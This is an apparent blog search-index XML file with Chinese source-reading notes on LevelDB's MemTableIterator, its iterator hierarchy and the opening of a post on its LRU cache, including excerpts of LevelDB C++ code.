<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>leveldb源码阅读记录-MemTableIterator</title>
      <link href="/archives/51540516.html"/>
      <url>/archives/51540516.html</url>
      
        <content type="html"><![CDATA[<h2 id="MemTableIterator"><a href="#MemTableIterator" class="headerlink" title="MemTableIterator"></a>MemTableIterator</h2><p>读这篇文章前，请先阅读 skiplist实现和memtable两篇文章。</p><p>MemTableIteraotr是用来遍历MemTable的Iterator。</p><h2 id="1-基本定义"><a href="#1-基本定义" class="headerlink" title="1. 基本定义"></a>1. 基本定义</h2><p>下面是它的代码，代码很短：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MemTableIterator</span> :</span> <span class="keyword">public</span> Iterator &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">MemTableIterator</span><span class="params">(MemTable::Table* table)</span> : <span class="title">iter_</span><span class="params">(table)</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">  MemTableIterator(<span class="keyword">const</span> MemTableIterator&amp;) = <span class="keyword">delete</span>;</span><br><span class="line">  MemTableIterator&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> MemTableIterator&amp;) = <span class="keyword">delete</span>;</span><br><span class="line"></span><br><span class="line">  ~MemTableIterator() <span class="keyword">override</span> = <span class="keyword">default</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">Valid</span><span class="params">()</span> <span class="keyword">const</span> <span class="keyword">override</span> </span>&#123; <span class="keyword">return</span> iter_.Valid(); &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Seek</span><span class="params">(<span class="keyword">const</span> Slice&amp; k)</span> <span class="keyword">override</span> </span>&#123; iter_.Seek(EncodeKey(&amp;tmp_, k)); &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">SeekToFirst</span><span class="params">()</span> <span class="keyword">override</span> </span>&#123; iter_.SeekToFirst(); &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">SeekToLast</span><span class="params">()</span> <span class="keyword">override</span> </span>&#123; iter_.SeekToLast(); &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Next</span><span class="params">()</span> <span class="keyword">override</span> </span>&#123; iter_.Next(); &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Prev</span><span class="params">()</span> <span class="keyword">override</span> </span>&#123; iter_.Prev(); &#125;</span><br><span class="line">  <span class="function">Slice <span class="title">key</span><span class="params">()</span> <span class="keyword">const</span> <span class="keyword">override</span> </span>&#123; <span class="keyword">return</span> GetLengthPrefixedSlice(iter_.key()); &#125;</span><br><span class="line">  <span class="function">Slice <span class="title">value</span><span class="params">()</span> <span class="keyword">const</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    Slice key_slice = GetLengthPrefixedSlice(iter_.key());</span><br><span class="line">    <span class="keyword">return</span> GetLengthPrefixedSlice(key_slice.data() + key_slice.<span class="built_in">size</span>());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">Status <span class="title">status</span><span class="params">()</span> <span class="keyword">const</span> <span class="keyword">override</span> </span>&#123; <span class="keyword">return</span> Status::OK(); &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  MemTable::Table::Iterator iter_;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span> tmp_;  <span class="comment">// For passing to EncodeKey</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到，MemTableIterator是对MemTable::Table::Iterator的简单封装，也就是说，真正的iterator是MemTable::Table::Iterator，</p><p>MemTable::Table其实是SkipList的别名，所以最终就是对SkipList的Iterator的封装。所以要求对MemTable的SkipList实现有所了解。</p><p>虽然MemTableIterator只是对SkipList的Iter的薄薄封装，但这里有两个地方特殊，那就是key和value。</p><p>如果你之前阅读了本系列的ksiplist文章， 那应该知道skiplist中只有key没有value， key里面存放的东西就是本文开篇中给出的图。它既包含了key也包含了value。下图是iter中的key的布局：</p><p>![](<span class="exturl" data-url="aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3JhdmVueHJ6L1BpY0JlZC9pbWcvbGV2ZWxkYua6kOeggemYheivuy1jb3B5LW1lbXRhYmxl5o+S5YWl5LiA5LiqZW50cnk=" title="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/leveldb源码阅读-copy-memtable插入一个entry">https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/leveldb源码阅读-copy-memtable插入一个entry<i class="fa fa-external-link"></i></span> (1).png)</p><h2 id="2-key"><a href="#2-key" class="headerlink" title="2. key"></a>2. key</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function">Slice <span class="title">key</span><span class="params">()</span> <span class="keyword">const</span> <span class="keyword">override</span> </span>&#123; <span class="keyword">return</span> GetLengthPrefixedSlice(iter_.key()); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> Slice <span class="title">GetLengthPrefixedSlice</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* data)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> len;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span>* p = data;</span><br><span class="line">  p = GetVarint32Ptr(p, p + <span class="number">5</span>, &amp;len);  <span class="comment">// +5: we assume "p" is not corrupted</span></span><br><span class="line">  <span class="keyword">return</span> Slice(p, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先获取internal key 的长度，然后得到Internal key。</p><h2 id="3-value"><a href="#3-value" class="headerlink" title="3. value"></a>3. value</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Slice <span class="title">value</span><span class="params">()</span> <span class="keyword">const</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">  Slice key_slice = GetLengthPrefixedSlice(iter_.key());</span><br><span class="line">  <span class="keyword">return</span> GetLengthPrefixedSlice(key_slice.data() + key_slice.<span class="built_in">size</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取internal key后，给第二个GetLengthPrefixedSlice传入的参数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key_slice.data() + key_slice.<span class="built_in">size</span>()</span><br></pre></td></tr></table></figure><p>是value size字段的首地址，所以这里返回的是实际的value。</p><p><strong>到这里我们可以补充一条内容，MemTable中存放的key是整个MemTable key（包括internel key size 和 internal key), 但是对外部呈现的却是一个internal key。</strong></p>]]></content>
      
      
      <categories>
          
          <category> leveldb </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>leveldb源码阅读记录-Iterator-OverView</title>
      <link href="/archives/2b8370d3.html"/>
      <url>/archives/2b8370d3.html</url>
      
        <content type="html"><![CDATA[<p>通过之前对LevelDB的整体流程，数据存储以及元信息管理的介绍，我们已经基本完整的了解了LevelDB。从这篇文章开始，我们将重心转移到Iterator上，这是一种统一的访问底层数据的设计模式，用户不用关心底层数据是如何存储，只需使用Iterator提供的几种操作接口，即可访问。本文是leveldb众多iterator的一个总览，后文再对各个Iterator单独分析。</p><p>本文转载自：<span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC83ZmUyNGE3NzAwMmE=" title="https://www.jianshu.com/p/7fe24a77002a">https://www.jianshu.com/p/7fe24a77002a<i class="fa fa-external-link"></i></span></p><a id="more"></a><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a><strong>作用</strong></h2><p>正如<span class="exturl" data-url="aHR0cHM6Ly9saW5rLmppYW5zaHUuY29tP3Q9aHR0cDovL2NhdGthbmcuZ2l0aHViLmlvLzIwMTcvMDEvMTcvbGV2ZWxkYi1kYXRhLmh0bWw=" title="https://link.jianshu.com?t=http://catkang.github.io/2017/01/17/leveldb-data.html">庖丁解LevelDB之数据存储<i class="fa fa-external-link"></i></span>中介绍的，LevelDB各个组件用不同的格式进行数据存取。在LevelDB内部外部，各个不同阶段又不可避免的需要从不同的视角遍历这些数据。如果每一个层次的数据遍历都需要详细的关心全部数据存储格式，无疑将使得整个过程变得无比的冗余复杂。Iterator的出现正式为了解决这个问题，Iterator在各个层次上，向上层实现提供了：</p><p><strong>无须了解下层存储细节的情况下，通过统一接口对下层数据进行遍历的能力。</strong></p><h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a><strong>接口</strong></h2><p>Iterator用确定的遍历接口将上层需求和下层实现解耦和。熟悉STL的同学一定不会陌生Iterator的使用方式，这里LevelDB的Iterator接口包括：</p><ul><li>Seek到某一位置：Seek，SeekToFirst，SeekToLast；</li><li>访问前驱后继：Next，Prev；</li><li>判断当前位置是否有效：Valid；</li><li>获取当前位置数据信息：key，value，status；</li><li>可以注册多个Cleanup方法，当Iterator析构前做一些清理操作。</li></ul><h3 id="Iterator虚基类定义"><a href="#Iterator虚基类定义" class="headerlink" title="Iterator虚基类定义"></a>Iterator虚基类定义</h3><p>下面给出，Iterator虚基类的定义：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LEVELDB_EXPORT</span> <span class="title">Iterator</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  Iterator();</span><br><span class="line"></span><br><span class="line">  Iterator(<span class="keyword">const</span> Iterator&amp;) = <span class="keyword">delete</span>;</span><br><span class="line">  Iterator&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> Iterator&amp;) = <span class="keyword">delete</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">virtual</span> ~Iterator();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// An iterator is either positioned at a key/value pair, or</span></span><br><span class="line">  <span class="comment">// not valid.  This method returns true iff the iterator is valid.</span></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="keyword">bool</span> <span class="title">Valid</span><span class="params">()</span> <span class="keyword">const</span> </span>= <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Position at the first key in the source.  The iterator is Valid()</span></span><br><span class="line">  <span class="comment">// after this call iff the source is not empty.</span></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">SeekToFirst</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Position at the last key in the source.  The iterator is</span></span><br><span class="line">  <span class="comment">// Valid() after this call iff the source is not empty.</span></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">SeekToLast</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Position at the first key in the source that is at or past target.</span></span><br><span class="line">  <span class="comment">// The iterator is Valid() after this call iff the source contains</span></span><br><span class="line">  <span class="comment">// an entry that comes at or past target.</span></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">Seek</span><span class="params">(<span class="keyword">const</span> Slice&amp; target)</span> </span>= <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Moves to the next entry in the source.  After this call, Valid() is</span></span><br><span class="line">  <span class="comment">// true iff the iterator was not positioned at the last entry in the source.</span></span><br><span class="line">  <span class="comment">// REQUIRES: Valid()</span></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">Next</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Moves to the previous entry in the source.  After this call, Valid() is</span></span><br><span class="line">  <span class="comment">// true iff the iterator was not positioned at the first entry in source.</span></span><br><span class="line">  <span class="comment">// REQUIRES: Valid()</span></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">Prev</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Return the key for the current entry.  The underlying storage for</span></span><br><span class="line">  <span class="comment">// the returned slice is valid only until the next modification of</span></span><br><span class="line">  <span class="comment">// the iterator.</span></span><br><span class="line">  <span class="comment">// REQUIRES: Valid()</span></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> Slice <span class="title">key</span><span class="params">()</span> <span class="keyword">const</span> </span>= <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Return the value for the current entry.  The underlying storage for</span></span><br><span class="line">  <span class="comment">// the returned slice is valid only until the next modification of</span></span><br><span class="line">  <span class="comment">// the iterator.</span></span><br><span class="line">  <span class="comment">// REQUIRES: Valid()</span></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> Slice <span class="title">value</span><span class="params">()</span> <span class="keyword">const</span> </span>= <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If an error has occurred, return it.  Else return an ok status.</span></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> Status <span class="title">status</span><span class="params">()</span> <span class="keyword">const</span> </span>= <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Clients are allowed to register function/arg1/arg2 triples that</span></span><br><span class="line">  <span class="comment">// will be invoked when this iterator is destroyed.</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Note that unlike all of the preceding methods, this method is</span></span><br><span class="line">  <span class="comment">// not abstract and therefore clients should not override it.</span></span><br><span class="line">  <span class="keyword">using</span> CleanupFunction = <span class="keyword">void</span> (*)(<span class="keyword">void</span>* arg1, <span class="keyword">void</span>* arg2);</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">RegisterCleanup</span><span class="params">(CleanupFunction function, <span class="keyword">void</span>* arg1, <span class="keyword">void</span>* arg2)</span></span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="comment">// Cleanup functions are stored in a single-linked list.</span></span><br><span class="line">  <span class="comment">// The list's head node is inlined in the iterator.</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">CleanupNode</span> &#123;</span></span><br><span class="line">    <span class="comment">// True if the node is not used. Only head nodes might be unused.</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">IsEmpty</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> function == <span class="literal">nullptr</span>; &#125;</span><br><span class="line">    <span class="comment">// Invokes the cleanup function.</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      assert(function != <span class="literal">nullptr</span>);</span><br><span class="line">      (*function)(arg1, arg2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The head node is used if the function pointer is not null.</span></span><br><span class="line">    CleanupFunction function;</span><br><span class="line">    <span class="keyword">void</span>* arg1;</span><br><span class="line">    <span class="keyword">void</span>* arg2;</span><br><span class="line">    CleanupNode* next;</span><br><span class="line">  &#125;;</span><br><span class="line">  CleanupNode cleanup_head_;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到Iterator定义了一个迭代器的通用接口，同时还包含了一个cleanup链表，可以向iterator注册多个cleanup函数，这些cleanup函数会在iterator析构时被调用。</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a><strong>分类</strong></h2><p>LevelDB大量使用了各种Iterator，根据Iterator的实现和层次，我们将其分为三种类型：</p><ul><li>基本Iterator：最原子的Iterator，针对相应的数据结构实现Iterator接口；</li><li>组合Iterator：通过各种方式将多个基本Iterator组合起来，向上层提供一致的Iterator接口。</li><li>功能Iterator：某种或多种组合Iterator的联合使用，附加一些必要的信息，实现某个过程中的遍历操作。</li></ul><h2 id="基本Iterator"><a href="#基本Iterator" class="headerlink" title="基本Iterator"></a><strong>基本Iterator</strong></h2><p>LevelDB中包括三种基本Iterator，他们分别针对Memtable，Block以及Version中的文件索引格式，实现了最原子的Iterator：</p><h4 id="1，MemTableIterator"><a href="#1，MemTableIterator" class="headerlink" title="1，MemTableIterator"></a><strong>1，MemTableIterator</strong></h4><p>在Memtable Skiplist的格式上的Iterator实现。Memtable格式见<span class="exturl" data-url="aHR0cHM6Ly9saW5rLmppYW5zaHUuY29tP3Q9aHR0cDovL2NhdGthbmcuZ2l0aHViLmlvLzIwMTcvMDEvMTcvbGV2ZWxkYi1kYXRhLmh0bWw=" title="https://link.jianshu.com?t=http://catkang.github.io/2017/01/17/leveldb-data.html">庖丁解LevelDB之数据存储<i class="fa fa-external-link"></i></span>。</p><h4 id="2，Block-Iter"><a href="#2，Block-Iter" class="headerlink" title="2，Block::Iter"></a><strong>2，Block::Iter</strong></h4><p>针对SST文件Block存储格式的Iterator实现。遍历的过程中解析重启点，拼接key的共享部分和特有部分，获取对应的value值。Block详细格式见<span class="exturl" data-url="aHR0cHM6Ly9saW5rLmppYW5zaHUuY29tP3Q9aHR0cDovL2NhdGthbmcuZ2l0aHViLmlvLzIwMTcvMDEvMTcvbGV2ZWxkYi1kYXRhLmh0bWw=" title="https://link.jianshu.com?t=http://catkang.github.io/2017/01/17/leveldb-data.html">庖丁解LevelDB之数据存储<i class="fa fa-external-link"></i></span>。</p><h4 id="3，Version-LevelFileNumIterator"><a href="#3，Version-LevelFileNumIterator" class="headerlink" title="3，Version::LevelFileNumIterator"></a><strong>3，Version::LevelFileNumIterator</strong></h4><p><span class="exturl" data-url="aHR0cHM6Ly9saW5rLmppYW5zaHUuY29tP3Q9aHR0cDovL2NhdGthbmcuZ2l0aHViLmlvLzIwMTcvMDIvMDMvbGV2ZWxkYi12ZXJzaW9uLmh0bWw=" title="https://link.jianshu.com?t=http://catkang.github.io/2017/02/03/leveldb-version.html">庖丁解LevelDB之版本控制<i class="fa fa-external-link"></i></span>中介绍了Version中记录了当前所有文件按层次划分的二维数组。其中Level1层之上的文件由于相互之间没有交集且有序，可以利用文件信息中的最大最小Key来进行二分查找。LevelFileNumIterator就是利用这个特点实现的对文件元信息进行遍历的Iterator。其中每个项记录了当前文件最大key到文件元信息的映射关系。这里的文件元信息包含文件号及文件长度。</p><h2 id="组合Iterator"><a href="#组合Iterator" class="headerlink" title="组合Iterator"></a><strong>组合Iterator</strong></h2><p>组合Iterator由上述多个基本Iterator或组合Iterator组合而成，LevelDB中包含两种组合Iterator</p><h4 id="1，TwoLevelIterator"><a href="#1，TwoLevelIterator" class="headerlink" title="1，TwoLevelIterator"></a><strong>1，TwoLevelIterator</strong></h4><p>TwoLevelIterator实现逻辑上有层次关系的数据的遍历操作。组合了<strong>index iterator</strong>和<strong>data iterator</strong>两层迭代器，其中index iterator记录从数据key值到data iterator的映射，而data iterator则负责真正数据key到value的映射。生成TwoLevelIterator时，需要提供index Iterator及BlockFunction函数，其中BlockFunction实现了index iterator value值的反序列化以及对应的data iterator的生成。</p><h4 id="2，MergingIterator"><a href="#2，MergingIterator" class="headerlink" title="2，MergingIterator"></a><strong>2，MergingIterator</strong></h4><p>通过MergingIterator可以实现多个有序数据集合的归并操作。其中包含多个<strong>child iterator</strong>组成的集合。对MergingIterator的遍历会有序的遍历其child iterator中的每个元素。</p><h2 id="功能Iterator"><a href="#功能Iterator" class="headerlink" title="功能Iterator"></a><strong>功能Iterator</strong></h2><p>为了实现不同场景下不同层次的数据遍历操作，可以联合一种或多种组合Iterator，这里称为功能Iterator，按其所负责的数据层次由下自上进行介绍：</p><h4 id="1，Table-Iterator"><a href="#1，Table-Iterator" class="headerlink" title="1，Table::Iterator"></a><strong>1，Table::Iterator</strong></h4><p>对SST文件的遍历，通过<span class="exturl" data-url="aHR0cHM6Ly9saW5rLmppYW5zaHUuY29tP3Q9aHR0cDovL2NhdGthbmcuZ2l0aHViLmlvLzIwMTcvMDEvMTcvbGV2ZWxkYi1kYXRhLmh0bWw=" title="https://link.jianshu.com?t=http://catkang.github.io/2017/01/17/leveldb-data.html">庖丁解LevelDB之数据存储<i class="fa fa-external-link"></i></span>可知，这里有明显的层级关系，可以利用上面介绍的TwoLevelIterator，其<strong>index iterator</strong>为Index Block的Block::Iter，<strong>data iterator</strong>为Data Block的Block::Iter</p><p><img data-src="https://upload-images.jianshu.io/upload_images/530927-6993a1249b141f7e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/415/format/webp" alt=""></p><p>Table::Iterator</p><h4 id="2，Compaction过程Iterator"><a href="#2，Compaction过程Iterator" class="headerlink" title="2，Compaction过程Iterator"></a><strong>2，Compaction过程Iterator</strong></h4><p>Compaction过程中需要对多个文件进行归并操作，并将结果输出到新的下层文件。LevelDB用MergingIterator来实现这个过程，其<strong>clild iterator</strong>包括<span class="exturl" data-url="aHR0cHM6Ly9saW5rLmppYW5zaHUuY29tP3Q9aHR0cDovL2NhdGthbmcuZ2l0aHViLmlvLzIwMTcvMDIvMDMvbGV2ZWxkYi12ZXJzaW9uLmh0bWw=" title="https://link.jianshu.com?t=http://catkang.github.io/2017/02/03/leveldb-version.html">庖丁解LevelDB之版本控制<i class="fa fa-external-link"></i></span>中提到的要Compaction的多个文件对应的Iterator：</p><ul><li><p>如果有Level0文件，则包含所有level0文件的Table::Iterator</p></li><li><p>其他Level文件，包含文件索引的TwoLevelIterator，由Version::LevelFileNumIterato作为index iterator，Table::Iterator作为data iterator</p></li></ul><p><img data-src="https://upload-images.jianshu.io/upload_images/530927-2b69b6b6c162fa70.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/998/format/webp" alt=""></p><p>Compaction过程Iterator</p><h4 id="3，NewInternalIterator"><a href="#3，NewInternalIterator" class="headerlink" title="3，NewInternalIterator"></a><strong>3，NewInternalIterator</strong></h4><p>LevelDB作为整体同样通过Iterator向外部用户提供遍历全部数据的能力。这里使用MergingIterator将Memtable，Immutable memtable及各层SST文件的Iterator归并起来，使得外部使用者不用关心具体的内部实现而有序的循环LevelDB内部的数据，LevelDB首先实现了NewInternalIterator：</p><p><img data-src="https://upload-images.jianshu.io/upload_images/530927-cacadb66612c54d0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt=""></p><p>在NewInternalIterator的基础上，LevelDB又封装了DBIter来处理快照，过滤已删除key。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a><strong>参考</strong></h2><p>Source Code：<span class="exturl" data-url="aHR0cHM6Ly9saW5rLmppYW5zaHUuY29tP3Q9aHR0cHM6Ly9naXRodWIuY29tL2dvb2dsZS9sZXZlbGRi" title="https://link.jianshu.com?t=https://github.com/google/leveldb">https://github.com/google/leveldb<i class="fa fa-external-link"></i></span></p><p>庖丁解LevelDB之概览: <span class="exturl" data-url="aHR0cHM6Ly9saW5rLmppYW5zaHUuY29tP3Q9aHR0cDovL2NhdGthbmcuZ2l0aHViLmlvLzIwMTcvMDEvMDcvbGV2ZWxkYi1zdW1tYXJ5Lmh0bWw=" title="https://link.jianshu.com?t=http://catkang.github.io/2017/01/07/leveldb-summary.html">http://catkang.github.io/2017/01/07/leveldb-summary.html<i class="fa fa-external-link"></i></span></p><p>庖丁解LevelDB之数据管理: <span class="exturl" data-url="aHR0cHM6Ly9saW5rLmppYW5zaHUuY29tP3Q9aHR0cDovL2NhdGthbmcuZ2l0aHViLmlvLzIwMTcvMDEvMDcvbGV2ZWxkYi1zdW1tYXJ5Lmh0bWw=" title="https://link.jianshu.com?t=http://catkang.github.io/2017/01/07/leveldb-summary.html">http://catkang.github.io/2017/01/07/leveldb-summary.html<i class="fa fa-external-link"></i></span></p><p>庖丁解LevelDB之版本控制：<span class="exturl" data-url="aHR0cHM6Ly9saW5rLmppYW5zaHUuY29tP3Q9aHR0cDovL2NhdGthbmcuZ2l0aHViLmlvLzIwMTcvMDIvMDMvbGV2ZWxkYi12ZXJzaW9uLmh0bWw=" title="https://link.jianshu.com?t=http://catkang.github.io/2017/02/03/leveldb-version.html">http://catkang.github.io/2017/02/03/leveldb-version.html<i class="fa fa-external-link"></i></span></p>]]></content>
      
      
      <categories>
          
          <category> leveldb </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>leveldb源码阅读记录-Cache</title>
      <link href="/archives/ce22f5e9.html"/>
      <url>/archives/ce22f5e9.html</url>
      
        <content type="html"><![CDATA[<p>leveldb是一种对写优化的kv存储系统，读性能有所下降，为了充分利用局部性原理，提高读性能，leveldb自己也设计了一个Cache结构。内部采用LRU替换策略。</p><a id="more"></a><p>leveldb中的cache主要包含以下类：</p><ul><li>LRUHandle – 数据节点</li><li>HandleTable – HashTable</li><li>LRUCache</li><li>ShardedLRUCache</li></ul><p>事实上到了第三个数据结构LRUCache，LRU的缓存管理数据结构已经实现了，之所以引入第四个数据结构，就是因为减少竞争。因为多线程访问需要加锁，为了减少竞争，提升效率，ShardedLRUCache内部有<strong>16个LRUCach</strong>e，查找key的时候，先计算属于哪一个LRUCache，然后在相应的LRUCache中上锁查找。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ShardedLRUCache</span> :</span> <span class="keyword">public</span> Cache &#123;  </span><br><span class="line"> <span class="keyword">private</span>:  </span><br><span class="line">  LRUCache shard_[kNumShards];  </span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这不是什么高深的思路，这种减少竞争的策略非常常见。因此，读懂缓存管理策略的关键在前三个数据结构。</p><p>LevelDB的Cache管理，维护有2个双向链表和一个哈希表。哈希表是非常容易理解的。如何确定一个key值到底存不存在，如果存在如何快速获取key值对应的value值。我们都学过数据结构，这活，哈希表是比较适合的。</p><p>注意，我们都知道，hash表存在一个重要的问题，就是碰撞，有可能多个不同的键值hash之后值相同，解决碰撞的一个重要思路是链表，将hash之后计算的key相同的元素链入同一个表头对应的链表。</p><p>可是我们并不满意这种速度，LevelDB做了进一步的优化，即及时扩大hash桶的个数，尽可能地不会发生碰撞。因此LevelDB自己实现了一个hash表，即HandleTable数据结构。</p><p>说句题外话，我不太喜欢数据结构的命名方式，比如HandleTable，命名就是个HashTable，如果出现Hash会好理解很多。这个名字还自罢了，LRUHandle这个名字更是让人摸不到头脑，明明就是一个数据节点，如果名字中出现Node，整个代码都会好理解很多。好了吐槽结束，看下HandleTable的数据结构：</p><h2 id="1-HandleTable"><a href="#1-HandleTable" class="headerlink" title="1. HandleTable"></a>1. HandleTable</h2><p>HandleTable在本质上就是一个HashTable，只是leveldb做了优化，通过尽早的拓展桶，来达到减少碰撞的目的。</p><p>成员变量：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span 